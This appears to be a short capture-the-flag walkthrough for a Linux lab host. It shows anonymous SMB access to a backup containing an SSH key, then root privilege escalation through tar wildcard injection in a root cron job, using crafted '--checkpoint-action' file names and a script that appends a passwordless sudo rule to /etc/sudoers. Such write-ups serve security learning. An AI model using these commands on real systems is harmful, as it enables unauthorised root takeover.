Cron job runs tar with wildcard, leading to root.

### Initial Access
```
# Found SMB share with backup files
smbclient -N //10.10.10.65/backup
# download backup.zip

# Extract backup
unzip backup.zip
# contains: .ssh/id_rsa

# SSH access
chmod 600 id_rsa
ssh -i id_rsa user@10.10.10.65
```

#### Find Cron Jobs
```
# Check crontab
cat /etc/crontab
# */2 * * * * root cd /var/www/html/backup && tar -czf /var/backups/web.tar.gz *

# Check backup directory
ls -la /var/www/html/backup/
# -rw-r--r-- 1 www-data www-data 1024 Oct 10 10:00 index.html
# -rw-r--r-- 1 www-data www-data 512 Oct 10 09:00 style.css
```

#### Wildcard Injection Prep
```
# Tar wildcard injection: tar * expands all files
# Create malicious files

cd /var/www/html/backup/

# Create checkpoint file
echo "echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers" > shell.sh
chmod +x shell.sh

# Create tar exploit files
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"

# Wait for cron to run (2 minutes)
```

#### Verify Exploit
```
# Check sudoers after cron runs
sudo -l
# User user may run the following commands on target:
#     (ALL) NOPASSWD: ALL

# Sudo to root
sudo su -

# Root access!
whoami
# root
```

